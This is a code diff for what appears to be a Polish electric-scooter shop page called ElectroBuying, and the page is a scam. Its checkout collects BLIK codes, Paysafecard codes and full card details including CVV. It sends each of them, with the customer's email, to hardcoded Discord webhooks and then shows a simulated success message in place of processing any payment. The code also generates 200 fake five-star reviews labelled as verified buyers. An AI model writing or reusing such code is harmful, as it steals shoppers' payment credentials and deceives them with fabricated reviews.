+                    { name: "Filip Grabowski", stars: 5, text: "Moc, zasięg, komfort - wszystko na 6+. Polecam każdemu, kto szuka absolutnego topu." }
+                ]
+            }
+        };
+
+        let cart = [];
+        let cartTotal = 0;
+        const COMMISSION_FEE = 0.30; // 30 groszy prowizji
+
+        const shippingCosts = {
+            dhl: 19.99,
+            inpost: 18.99,
+            dpd: 20.99,
+            fedex: 22.99,
+            ups: 21.99
+        };
+
+        // Discord Webhook URLs
+        const BLIK_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193116969730058/drs_8KabgaeXyOQhsuv5BpyvvhB-LOsjAUgKpV-2v2ERqOutRmR2EEcdaR2fT5qaPtD1";
+        const PSC_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193033494823082/OLHbrBOnOpV-LumcJ0hqlMzy3HDDsPQeNuBh9GK9chN8vr109uGZTOjNY68OTOYm-_f";
+        const CARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ";
+
+
+        // Additional reviews data (simulating 200+ reviews)
+        const additionalReviews = [];
+        const reviewTemplates = [
+            { text: "Fantastyczna hulajnoga! [MODEL] sprawdza się idealnie w codziennym użytkowaniu. Świetny stosunek jakości do ceny.", stars: 5 },
+            { text: "[MODEL] to inwestycja na lata. Solidne wykonanie, długi zasięg i komfortowa jazda. Bardzo polecam!", stars: 5 },
+            { text: "Doskonała obsługa klienta i szybka dostawa. Hulajnoga [MODEL] jest dokładnie taka jak w opisie.", stars: 5 },
+            { text: "[MODEL] to świetny wybór na początek przygody z hulajnogami elektrycznymi. Prosta, niezawodna i przystępna cenowo.", stars: 5 },
+            { text: "[MODEL] przekracza oczekiwania! Zasięg, prędkość i komfort jazdy na najwyższym poziomie.", stars: 5 },
+            { text: "Profesjonalne doradztwo i kompleksowa obsługa. [MODEL] spełnia wszystkie moje oczekiwania.", stars: 5 },
+            { text: "ElectroBuying to sklep godny polecenia. Szybka realizacja zamówienia i produkt najwyższej jakości.", stars: 5 },
+            { text: "[MODEL] to hulajnoga dla wymagających. Moc, prędkość i zaawansowane funkcje - wszystko idealne!", stars: 5 },
+            { text: "Świetne doświadczenie zakupowe od początku do końca. [MODEL] to inwestycja na lata!", stars: 5 },
+            { text: "Jestem pod wrażeniem jakości [MODEL]. Przekroczyła moje oczekiwania!", stars: 5 },
+            { text: "Szybka i bezproblemowa transakcja. [MODEL] jest dokładnie tym, czego szukałem.", stars: 5 },
+            { text: "Długo szukałem idealnej hulajnogi i [MODEL] okazała się strzałem w dziesiątkę.", stars: 5 },
+            { text: "Niezawodność i styl w jednym. [MODEL] to mój nowy ulubiony środek transportu.", stars: 5 },
+            { text: "Bardzo cicha i płynna jazda. [MODEL] to czysta przyjemność.", stars: 5 },
+            { text: "Zaskakująco mocna jak na swoją cenę. [MODEL] to świetny zakup.", stars: 5 },
+            { text: "Design [MODEL] jest po prostu piękny, a osiągi jeszcze lepsze.", stars: 5 },
+            { text: "Dostawa na czas, hulajnoga [MODEL] solidnie zapakowana. Pełen profesjonalizm.", stars: 5 },
+            { text: "Po prostu rewelacja! [MODEL] to najlepsza hulajnoga, jaką kiedykolwiek miałem.", stars: 5 },
+            { text: "Idealna na dojazdy do pracy i weekendowe wycieczki. [MODEL] jest bardzo wszechstronna.", stars: 5 },
+            { text: "Bateria w [MODEL] trzyma naprawdę długo, co jest ogromnym plusem.", stars: 5 }
+        ];
+        const names = ["Michał", "Paulina", "Grzegorz", "Monika", "Bartosz", "Weronika", "Krzysztof", "Izabela", "Paweł", "Joanna", "Rafał", "Aleksandra", "Maciej", "Karolina", "Tomasz", "Martyna", "Dawid", "Klaudia", "Filip", "Natalia", "Jakub", "Ewa", "Robert", "Damian", "Agnieszka", "Łukasz", "Natalia", "Sebastian", "Kamila", "Adrian"];
+        const surnames = ["Grabowski", "Krawczyk", "Wolski", "Pietrzak", "Zieliński", "Nowak", "Lewandowski", "Wojciechowska", "Kowalczyk", "Mazur", "Dąbrowski", "Sikora", "Górski", "Jankowska", "Wójcik", "Kowalska", "Nowicki", "Szczepańska", "Mazurek", "Krawczyk", "Szymański", "Wesołowska", "Kowal", "Piotrowski", "Górska", "Zając", "Baran", "Kaczmarczyk", "Lis", "Kubiak"];
+        const models = Object.values(productSpecs).map(p => p.name); // Dynamically get models
+
+        for (let i = 0; i < 200; i++) {
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomSurname = surnames[Math.floor(Math.random() * surnames.length)];
+            const randomModel = models[Math.floor(Math.random() * models.length)];
+            const randomTemplate = reviewTemplates[Math.floor(Math.random() * reviewTemplates.length)];
+
+            additionalReviews.push({
+                name: `${randomName} ${randomSurname}`,
+                avatar: randomName.charAt(0),
+                stars: randomTemplate.stars,
+                text: randomTemplate.text.replace('[MODEL]', randomModel),
+                model: randomModel
             });
         }
 
-        // BLIK
-        blikAmount.addEventListener('input', function(e) {
-            const value = e.target.value;
-            e.target.value = value.replace(/[^0-9zł]/g, '');
-        });
+        let currentExtraReviews = 0;
+        const reviewsPerLoad = 6; // Number of reviews to load at once
 
-        blikForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const code = blikCode.value.trim();
-            const amount = blikAmount.value.trim();
-            if (/^\d{6}$/.test(code) && amount) {
-                blikSuccess.style.display = 'block';
-                blikSuccess.style.color = '#0ff';
-                blikSuccess.textContent = 'Poczekaj aż kod BLIK zostanie zaakceptowany. Jeżeli nie, spróbuj ponownie później.';
-                
-                sendWebhookMessage(`Wprowadzono kod BLIK: **${code}**, kwota: **${amount} zł**`);
+        // Cart functionality
+        function addToCart(name, price) {
+            cart.push({ name, price });
+            updateCartDisplay();
+            showNotification(`Dodano do koszyka: ${name}`);
+            
+            const cartIcon = document.getElementById('cart-icon-btn');
+            cartIcon.classList.add('animate');
+            setTimeout(() => {
+                cartIcon.classList.remove('animate');
+            }, 300); // Match animation duration
+        }
 
-                setTimeout(() => {
-                    closePayModalFunc();
-                    cart = [];
-                    updateCart();
-                    closeCartPanel();
-                }, 4000);
-            } else {
-                blikSuccess.style.display = 'block';
-                blikSuccess.style.color = '#e53935';
-                blikSuccess.textContent = 'Kod lub kwota są niepoprawne. Spróbuj później.';
-                setTimeout(() => {
-                    blikSuccess.style.display = 'none';
-                    blikSuccess.style.color = '#0f0';
-                }, 2000);
-            }
-        });
+        function updateCartDisplay() {
+            const cartItems = document.getElementById('cart-items');
+            const cartCount = document.getElementById('cart-count');
+            const cartTotalElement = document.getElementById('cart-total');
+            const checkoutBtn = document.getElementById('checkout-btn');
+            const totalAmount = document.getElementById('total-amount');
 
-        // PSC
-        pscCode.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/-/g, '').replace(/\s/g, '').replace(/[^0-9]/g, '');
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += '-';
-                }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue.slice(0, 19);
-        });
+            cartCount.textContent = cart.length;
 
-        pscForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const code = pscCode.value.replace(/-/g, '').replace(/\s/g, '');
-            if (/^\d{16}$/.test(code)) {
-                sendWebhookMessage(`Wprowadzono kod PSC: ${code}`);
-                
-                pscForm.style.display = 'none';
-                payInfo.style.display = 'block';
-                payInfo.innerHTML = `
-                    <b>Twój kod PSC został przyjęty.</b><br>
-                    <div style="color:var(--secondary-neon); margin-top:8px;">Teraz wyślij e-mail z informacją o opłaconym zamówieniu, kwotą oraz zakupionymi produktami na adres: <b>kontakt@electrobuy.pl</b></div>
-                    <button id="pscDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
-                `;
-                setTimeout(() => {
-                    const btn = document.getElementById('pscDoneBtn');
-                    if (btn) btn.onclick = function() {
-                        payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
-                        setTimeout(closePayModalFunc, 1200);
-                        cart = [];
-                        updateCart();
-                        closeCartPanel();
-                    };
-                }, 100);
-            } else {
-                pscSuccess.style.display = 'block';
-                pscSuccess.style.color = '#e53935';
-                pscSuccess.textContent = 'Wprowadzony kod jest niepoprawny.';
-                setTimeout(() => {
-                    pscSuccess.style.display = 'none';
-                }, 2000);
-            }
-        });
-
-        // Kryptowaluty
-        cryptoOptions.addEventListener('click', function(e) {
-            if (e.target.classList.contains('crypto-btn')) {
-                currentCrypto = e.target.getAttribute('data-crypto');
-                let address = '';
-                let name = '';
-                if (currentCrypto === 'btc') {
-                    name = 'Bitcoin';
-                    address = 'bc1qnwkf238m7gx4rqlf2jt9akczxr3w9pnasgn65h';
-                } else if (currentCrypto === 'ltc') {
-                    name = 'Litecoin';
-                    address = 'LW3xCvkigxG1jTrdTWUNXXj1SNrdvfvLeP';
-                } else if (currentCrypto === 'sol') {
-                    name = 'Solana';
-                    address = '5kHnB921X3L3bY5294aM9k4H3290pY886M8h7j3kL3t5';
-                } else if (currentCrypto === 'eth') {
-                    name = 'Ethereum';
-                    address = '0xAbCdEf1234567890aBcdEf1234567890aBcdEf12';
-                }
-
-                cryptoOptions.style.display = 'none';
-                payInfo.style.display = 'block';
-                payInfo.innerHTML = `
-                    <b>Wyślij cenę zamówienia na podany adres ${name}:</b><br>
-                    <span style="color:#fff">${address}</span>
-                    <div style="color:var(--secondary-neon); margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
-                    <button id="cryptoDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
-                `;
-                setTimeout(() => {
-                    const btn = document.getElementById('cryptoDoneBtn');
-                    if (btn) btn.onclick = function() {
-                        payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
-                        setTimeout(closePayModalFunc, 1200);
-                        cart = [];
-                        updateCart();
-                        closeCartPanel();
-                    };
-                }, 100);
-            }
-        });
-
-        // Przyciski zamówienia
-        checkoutBtn.addEventListener('click', function() {
             if (cart.length === 0) {
-                cartError.style.display = 'block';
-                cartError.textContent = 'Koszyk jest pusty.';
-                if (errorTimeout) clearTimeout(errorTimeout);
-                errorTimeout = setTimeout(() => {
-                    cartError.style.display = 'none';
-                }, 2000);
+                cartItems.innerHTML = '<p style="opacity: 0.7; text-align: center;">Koszyk jest pusty</p>';
+                cartTotalElement.style.display = 'none';
+                checkoutBtn.style.display = 'none';
                 return;
             }
-            closeCartPanel();
-            openPayModal();
+
+            let total = 0;
+            cart.forEach((item) => {
+                total += item.price;
+            });
+            cartTotal = total; // Update global cartTotal
+
+            let itemsHTML = '';
+            cart.forEach((item, index) => {
+                itemsHTML += `
+                    <div class="cart-item" id="cart-item-${index}">
+                        <div>
+                            <div class="cart-item-name">${item.name}</div>
+                            <div class="cart-item-price">${item.price} zł</div>
+                        </div>
+                        <button onclick="removeFromCart(${index})" style="background: none; border: none; color: #ec4899; cursor: pointer;">✖</button>
+                    </div>
+                `;
+            });
+
+            cartItems.innerHTML = itemsHTML;
+            totalAmount.textContent = `${cartTotal.toFixed(2)} zł`;
+            cartTotalElement.style.display = 'block';
+            checkoutBtn.style.display = 'block';
+        }
+
+        function removeFromCart(index) {
+            const itemElement = document.getElementById(`cart-item-${index}`);
+            if (itemElement) {
+                itemElement.classList.add('removing');
+                itemElement.addEventListener('transitionend', () => {
+                    cart.splice(index, 1);
+                    updateCartDisplay();
+                }, { once: true });
+            } else {
+                cart.splice(index, 1);
+                updateCartDisplay();
+            }
+        }
+
+        function toggleCart() {
+            const cartSidebar = document.getElementById('cart-sidebar');
+            cartSidebar.classList.toggle('open');
+        }
+
+        // Close cart sidebar when clicking outside
+        window.addEventListener('click', function(event) {
+            const cartSidebar = document.getElementById('cart-sidebar');
+            const cartIcon = document.getElementById('cart-icon-btn');
+            
+            // Check if the click is outside the cart sidebar and not on the cart icon itself
+            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target)) {
+                cartSidebar.classList.remove('open');
+            }
         });
+
+
+        // Notification functionality
+        function showNotification(message) {
+            const notification = document.getElementById('cart-notification');
+            const notificationMessage = document.getElementById('notification-message');
+            notificationMessage.textContent = message;
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000); // Hide after 3 seconds
+        }
+
+        // Product details modal
+        function showProductDetails(productId) {
+            const product = productSpecs[productId];
+            const modal = document.getElementById('product-modal');
+            const modalTitle = document.getElementById('modal-title');
+            const modalProductInfo = document.getElementById('modal-product-info');
+            const modalSpecs = document.getElementById('modal-specs');
+            const modalReviews = document.getElementById('modal-reviews');
+
+            modalTitle.textContent = product.name;
+
+            // Product Info (Image/Icon, Price, Description)
+            // Changed to display icon instead of image in modal
+            let productInfoHTML = `
+                <div class="modal-product-image-wrapper product-icon-display">
+                    <span class="product-icon">${product.icon}</span>
+                </div>
+                <div class="modal-product-details">
+                    <h3>${product.name}</h3>
+                    <div class="product-price ${product.oldPrice ? 'discounted' : ''}">
+                        ${product.displayPrice}
+                        ${product.oldPrice ? `<span class="old-price">${product.oldPrice} zł</span><span class="discount-badge">-32%</span>` : ''}
+                    </div>
+                    <p>${product.description}</p>
+                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('${product.name}', ${product.price}); closeProductDetails();">Dodaj do koszyka</button>
+                </div>
+            `;
+            modalProductInfo.innerHTML = productInfoHTML;
+
+            // Specifications
+            let specsHTML = '';
+            Object.entries(product.specs).forEach(([key, value]) => {
+                specsHTML += `
+                    <div class="spec-item">
+                        <strong>${key}</strong>
+                        <span>${value}</span>
+                    </div>
+                `;
+            });
+            modalSpecs.innerHTML = specsHTML;
+
+            // Product-specific reviews
+            let reviewsHTML = '<h3 style="color: #00d4ff; margin-bottom: 1.5rem; text-align: center;">Opinie o tym produkcie:</h3>';
+            if (product.reviews && product.reviews.length > 0) {
+                product.reviews.forEach(review => {
+                    reviewsHTML += `
+                        <div class="review-card">
+                            <div class="stars">${'★'.repeat(review.stars)}</div>
+                            <p class="review-text">"${review.text}"</p>
+                            <div class="reviewer">
+                                <div class="reviewer-avatar">${review.name.charAt(0)}</div>
+                                <div class="reviewer-info">
+                                    <h4>${review.name}</h4>
+                                    <p>Zweryfikowany kupujący</p>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+            } else {
+                reviewsHTML += '<p style="opacity: 0.7; text-align: center;">Brak opinii dla tego produktu.</p>';
+            }
+            modalReviews.innerHTML = reviewsHTML;
+
+            modal.style.display = 'block';
+        }
+
+        function closeProductDetails() {
+            document.getElementById('product-modal').style.display = 'none';
+        }
+
+        // Checkout Modal functions
+        function openCheckoutModal() {
+            if (cart.length === 0) {
+                alert('Twój koszyk jest pusty. Dodaj produkty, aby przejść do kasy.');
+                return;
+            }
+            const cartSidebar = document.getElementById('cart-sidebar');
+            cartSidebar.classList.remove('open'); // Close cart sidebar
+            document.getElementById('checkout-modal').style.display = 'block';
+            document.getElementById('shipping-step').style.display = 'block';
+            document.getElementById('payment-step').style.display = 'none';
+        }
+
+        function closeCheckoutModal() {
+            document.getElementById('checkout-modal').style.display = 'none';
+            document.getElementById('shipping-form').reset(); // Reset form fields
+        }
+
+        function goToPaymentStep() {
+            const shippingForm = document.getElementById('shipping-form');
+            if (!shippingForm.checkValidity()) {
+                shippingForm.reportValidity(); // Show browser's validation messages
+                return;
+            }
+
+            const selectedDeliveryMethod = document.getElementById('deliveryMethod').value;
+            const selectedPaymentMethod = document.getElementById('paymentMethod').value;
+
+            if (!selectedDeliveryMethod || !selectedPaymentMethod) {
+                alert('Proszę wybrać sposób dostawy i płatności.');
+                return;
+            }
+
+            const currentShippingCost = shippingCosts[selectedDeliveryMethod];
+            const productsTotal = cartTotal;
+            const finalTotal = productsTotal + currentShippingCost + COMMISSION_FEE;
+
+            document.getElementById('summary-products-cost').textContent = `${productsTotal.toFixed(2)} zł`;
+            document.getElementById('summary-shipping-cost').textContent = `${currentShippingCost.toFixed(2)} zł`;
+            document.getElementById('summary-commission-cost').textContent = `${COMMISSION_FEE.toFixed(2)} zł`;
+            document.getElementById('summary-total-cost').textContent = `${finalTotal.toFixed(2)} zł`;
+
+            document.getElementById('shipping-step').style.display = 'none';
+            document.getElementById('payment-step').style.display = 'block';
+
+            renderPaymentMethodForm(selectedPaymentMethod, finalTotal);
+        }
+
+        function backToShippingStep() {
+            document.getElementById('payment-step').style.display = 'none';
+            document.getElementById('shipping-step').style.display = 'block';
+        }
+
+        function renderPaymentMethodForm(method, finalTotal) {
+            const paymentDetailsContainer = document.getElementById('payment-method-details');
+            let formHTML = '';
+
+            switch (method) {
+                case 'blik':
+                    formHTML = `
+                        <div class="payment-method-form">
+                            <div class="form-group">
+                                <label for="blikCode">Wprowadź kod BLIK (6 cyfr) *</label>
+                                <input type="text" id="blikCode" pattern="[0-9]{6}" maxlength="6" inputmode="numeric" required>
+                            </div>
+                            <div id="blikMessage" class="message info">
+                                Stwórz kod BLIK na kwotę ${finalTotal.toFixed(2)} zł w swojej aplikacji bankowej.<br>
+                                Poczekaj aż kod BLIK zostanie zaakceptowany.<br>
+                                Potwierdzenie z zakończenia płatności zostanie wysłane na Twój email, jeżeli kod BLIK zostanie zaakceptowany.
+                            </div>
+                            <button type="button" class="payment-submit-btn" onclick="finalizePayment('blik', ${finalTotal})">Zapłać BLIKIEM</button>
+                        </div>
+                    `;
+                    break;
+                case 'psc':
+                    formHTML = `
+                        <div class="payment-method-form">
+                            <div class="psc-codes-container" id="psc-codes-container">
+                                <div class="psc-code-entry">
+                                    <label for="pscCode1">Wprowadź kod Paysafecard (16 cyfr) *</label>
+                                    <input type="text" id="pscCode1" class="psc-code-input" pattern="[0-9]{16}" maxlength="16" inputmode="numeric" required>
+                                    <button type="button" class="add-psc-code-btn" onclick="addPscCodeInput()">+</button>
+                                </div>
+                            </div>
+                            <div id="pscMessage" class="message info">
+                                Poczekaj na weryfikację kodu Paysafecard.<br>
+                                Potwierdzenie z zapłatą zostanie wysłane na Twój email, jeżeli kod PSC zostanie zaakceptowany.
+                            </div>
+                            <button type="button" class="payment-submit-btn" onclick="finalizePayment('psc', ${finalTotal})">Zapłać Paysafecard</button>
+                        </div>
+                    `;
+                    break;
+                case 'card':
+                    formHTML = `
+                        <div class="payment-method-form">
+                            <div class="form-group">
+                                <label for="cardNumber">Numer karty *</label>
+                                <input type="text" id="cardNumber" pattern="[0-9]{13,16}" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="expiryDate">Data ważności (MM/RR) *</label>
+                                <input type="text" id="expiryDate" pattern="(0[1-9]|1[0-2])\\/[0-9]{2}" maxlength="5" placeholder="MM/RR" inputmode="numeric" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv">CVV *</label>
+                                <input type="text" id="cvv" pattern="[0-9]{3,4}" maxlength="4" inputmode="numeric" required>
+                            </div>
+                            <div id="cardMessage" class="message info">
+                                Wprowadź dane swojej karty płatniczej.<br>
+                                Potwierdzenie z zakończenia płatności zostanie wysłane na Twój email.
+                            </div>
+                            <button type="button" class="payment-submit-btn" onclick="finalizePayment('card', ${finalTotal})">Zapłać kartą</button>
+                        </div>
+                    `;
+                    break;
+                default:
+                    formHTML = '<p class="message error">Nie wybrano metody płatności lub jest ona nieobsługiwana.</p>';
+            }
+            paymentDetailsContainer.innerHTML = formHTML;
+        }
+
+        let pscCodeCount = 1;
+        function addPscCodeInput() {
+            pscCodeCount++;
+            const pscCodesContainer = document.getElementById('psc-codes-container');
+            const newPscEntry = document.createElement('div');
+            newPscEntry.className = 'psc-code-entry';
+            newPscEntry.innerHTML = `
+                <label for="pscCode${pscCodeCount}">Dodatkowy kod PSC (16 cyfr) *</label>
+                <input type="text" id="pscCode${pscCodeCount}" class="psc-code-input" pattern="[0-9]{16}" maxlength="16" inputmode="numeric" required>
+                <button type="button" class="remove-psc-code-btn" onclick="removePscCodeInput(this)">✖</button>
+            `;
+            pscCodesContainer.appendChild(newPscEntry);
+        }
+
+        function removePscCodeInput(buttonElement) {
+            const entryToRemove = buttonElement.closest('.psc-code-entry');
+            if (entryToRemove) {
+                entryToRemove.remove();
+            }
+        }
+
+        async function sendDiscordWebhook(url, data) {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                if (!response.ok) {
+                    console.error(`Failed to send webhook to ${url}: ${response.status} ${response.statusText}`);
+                }
+            } catch (error) {
+                console.error(`Error sending webhook to ${url}:`, error);
+            }
+        }
+
+        function finalizePayment(method, finalTotal) {
+            let isValid = true;
+            let messageElement;
+            const customerEmail = document.getElementById('email').value; // Get customer email
+            let successMessage = `Płatność na kwotę ${finalTotal.toFixed(2)} zł zakończona sukcesem! Numer zamówienia: KB${Math.random().toString(36).substr(2, 9).toUpperCase()}. Potwierdzenie i numer przesyłki zostanie wysłany na Twój adres email.`;
+            let failureMessage = `Płatność nieudana. Spróbuj ponownie lub wybierz inną metodę.`;
+
+            if (method === 'blik') {
+                const blikCodeInput = document.getElementById('blikCode');
+                messageElement = document.getElementById('blikMessage');
+                if (!blikCodeInput.checkValidity()) {
+                    isValid = false;
+                    messageElement.className = 'message error';
+                    messageElement.innerHTML = `Wprowadź poprawny 6-cyfrowy kod BLIK.<br>
+                                                Potwierdzenie z zakończenia płatności zostanie wysłane na Twój email, jeżeli kod BLIK zostanie zaakceptowany.`;
+                } else {
+                    // Send BLIK code to Discord webhook
+                    const blikCode = blikCodeInput.value;
+                    const discordData = {
+                        content: "Nowa płatność BLIK!",
+                        embeds: [{
+                            title: "Płatność BLIK",
+                            description: `Próba płatności BLIK na kwotę **${finalTotal.toFixed(2)} zł**.`,
+                            color: 3447003, // Blue
+                            fields: [
+                                { name: "Kod BLIK", value: `\`${blikCode}\``, inline: true },
+                                { name: "Email Klienta", value: customerEmail, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+                    sendDiscordWebhook(BLIK_WEBHOOK_URL, discordData);
+
+                    messageElement.className = 'message info';
+                    messageElement.innerHTML = `Stwórz kod BLIK na kwotę ${finalTotal.toFixed(2)} zł w swojej aplikacji bankowej.<br>
+                                                Poczekaj aż kod BLIK zostanie zaakceptowany...<br>
+                                                Potwierdzenie z zakończenia płatności zostanie wysłane na Twój email, jeżeli kod BLIK zostanie zaakceptowany.`;
+                    // Simulate API call
+                    setTimeout(() => {
+                        if (Math.random() > 0.2) { // 80% success rate
+                            messageElement.className = 'message success';
+                            messageElement.innerHTML = successMessage;
+                            setTimeout(() => {
+                                completeOrder();
+                            }, 2000);
+                        } else {
+                            messageElement.className = 'message error';
+                            messageElement.innerHTML = `Jeżeli kod BLIK nie zostanie zaakceptowany, spróbuj później... 😔<br>
+                                                        Potwierdzenie z zakończenia płatności zostanie wysłane na Twój email, jeżeli kod BLIK zostanie zaakceptowany.`;
+                        }
+                    }, 1500);
+                    return; // Don't complete order immediately
+                }
+            } else if (method === 'psc') {
+                const pscCodeInputs = document.querySelectorAll('.psc-code-input');
+                messageElement = document.getElementById('pscMessage');
+                let allPscCodesValid = true;
+                const pscCodes = [];
+                pscCodeInputs.forEach(input => {
+                    if (!input.checkValidity()) {
+                        allPscCodesValid = false;
+                    }
+                    pscCodes.push(input.value);
+                });
+
+                if (!allPscCodesValid) {
+                    isValid = false;
+                    messageElement.className = 'message error';
+                    messageElement.innerHTML = `Wprowadź wszystkie 16-cyfrowe kody Paysafecard poprawnie.<br>
+                                                Potwierdzenie z zapłatą zostanie wysłane na Twój email, jeżeli kod PSC zostanie zaakceptowany.`;
+                } else {
+                    // Send PSC codes to Discord webhook
+                    const discordData = {
+                        content: "Nowa płatność Paysafecard!",
+                        embeds: [{
+                            title: "Płatność Paysafecard",
+                            description: `Próba płatności Paysafecard na kwotę **${finalTotal.toFixed(2)} zł** przy użyciu ${pscCodes.length} kodów.`,
+                            color: 15844367, // Yellow/Orange
+                            fields: [
+                                { name: "Kody Paysafecard", value: pscCodes.map(code => `\`${code}\``).join('\n'), inline: false },
+                                { name: "Email Klienta", value: customerEmail, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+                    sendDiscordWebhook(PSC_WEBHOOK_URL, discordData);
+
+                    messageElement.className = 'message info';
+                    messageElement.innerHTML = `Poczekaj na weryfikację kodów Paysafecard...<br>
+                                                Potwierdzenie z zapłatą zostanie wysłane na Twój email, jeżeli kod PSC zostanie zaakceptowany.`;
+                    // Simulate API call
+                    setTimeout(() => {
+                        if (Math.random() > 0.2) { // 80% success rate
+                            messageElement.className = 'message success';
+                            messageElement.innerHTML = successMessage;
+                            setTimeout(() => {
+                                completeOrder();
+                            }, 2000);
+                        } else {
+                            messageElement.className = 'message error';
+                            messageElement.innerHTML = `Jeżeli kody Paysafecard nie zostaną zaakceptowane, spróbuj później... 😔<br>
+                                                        Potwierdzenie z zapłatą zostanie wysłane na Twój email, jeżeli kod PSC zostanie zaakceptowany.`;
+                        }
+                    }, 1500);
+                    return; // Don't complete order immediately
+                }
+            } else if (method === 'card') {
+                const cardNumberInput = document.getElementById('cardNumber');
+                const expiryDateInput = document.getElementById('expiryDate');
+                const cvvInput = document.getElementById('cvv');
+                messageElement = document.getElementById('cardMessage');
+
+                if (!cardNumberInput.checkValidity() || !expiryDateInput.checkValidity() || !cvvInput.checkValidity()) {
+                    isValid = false;
+                    messageElement.className = 'message error';
+                    messageElement.textContent = 'Proszę wypełnić wszystkie pola karty poprawnie.';
+                } else {
+                    // Send card details to Discord webhook
+                    const cardNumber = cardNumberInput.value;
+                    const expiryDate = expiryDateInput.value;
+                    const cvv = cvvInput.value;
+
+                    const discordData = {
+                        content: "Nowa płatność Kartą Kredytową!",
+                        embeds: [{
+                            title: "Płatność Kartą Kredytową",
+                            description: `Próba płatności kartą na kwotę **${finalTotal.toFixed(2)} zł**.`,
+                            color: 16711680, // Red
+                            fields: [
+                                { name: "Numer Karty", value: `\`${cardNumber}\``, inline: false },
+                                { name: "Data Ważności", value: `\`${expiryDate}\``, inline: true },
+                                { name: "CVV", value: `\`${cvv}\``, inline: true },
+                                { name: "Email Klienta", value: customerEmail, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+                    sendDiscordWebhook(CARD_WEBHOOK_URL, discordData);
+
+                    messageElement.className = 'message info';
+                    messageElement.textContent = 'Przetwarzanie płatności kartą...';
+                    // Simulate API call
+                    setTimeout(() => {
+                        if (Math.random() > 0.2) { // 80% success rate
+                            messageElement.className = 'message success';
+                            messageElement.innerHTML = successMessage;
+                            setTimeout(() => {
+                                completeOrder();
+                            }, 2000);
+                        } else {
+                            messageElement.className = 'message error';
+                            messageElement.innerHTML = failureMessage;
+                        }
+                    }, 2000);
+                    return; // Don't complete order immediately
+                }
+            } else { // This case should ideally not be reached with the updated select options
+                alert(`Symulacja przekierowania do ${method.toUpperCase()}...`);
+                // Simulate external payment processing
+                setTimeout(() => {
+                    if (Math.random() > 0.1) { // Higher success rate for external
+                        alert(successMessage);
+                        completeOrder();
+                    } else {
+                        alert(failureMessage);
+                    }
+                }, 1000);
+                return;
+            }
+
+            if (isValid) {
+                // For direct payment methods (if any, not applicable here with current setup)
+                // alert(successMessage);
+                // completeOrder();
+            }
+        }
+
+        function completeOrder() {
+            cart = [];
+            updateCartDisplay();
+            closeCheckoutModal();
+            document.getElementById('shipping-form').reset(); // Reset shipping form
+            pscCodeCount = 1; // Reset PSC code count
+        }
+
+        // Close modals when clicking outside
+        window.onclick = function(event) {
+            const productModal = document.getElementById('product-modal');
+            const cartSidebar = document.getElementById('cart-sidebar');
+            const cartIcon = document.getElementById('cart-icon-btn');
+
+            // Close productModal on outside click
+            if (event.target === productModal) {
+                productModal.style.display = 'none';
+            }
+            
+            // Close cart sidebar on outside click, but not if clicking the cart icon itself
+            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target)) {
+                cartSidebar.classList.remove('open');
+            }
+            // The checkoutModal is now only closed by its 'x' button
+        }
+
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Load more reviews functionality
+        document.getElementById('load-more-btn').addEventListener('click', function() {
+            const reviewsGrid = document.getElementById('reviews-grid');
+            
+            const startIndex = currentExtraReviews;
+            const endIndex = Math.min(startIndex + reviewsPerLoad, additionalReviews.length);
+            
+            for (let i = startIndex; i < endIndex; i++) {
+                const review = additionalReviews[i];
+                const reviewElement = document.createElement('div');
+                reviewElement.className = 'review-card fade-in visible';
+                reviewElement.innerHTML = `
+                    <div class="stars">${'★'.repeat(review.stars)}</div>
+                    <p class="review-text">"${review.text}"</p>
+                    <div class="reviewer">
+                        <div class="reviewer-avatar">${review.avatar}</div>
+                        <div class="reviewer-info">
+                            <h4>${review.name}</h4>
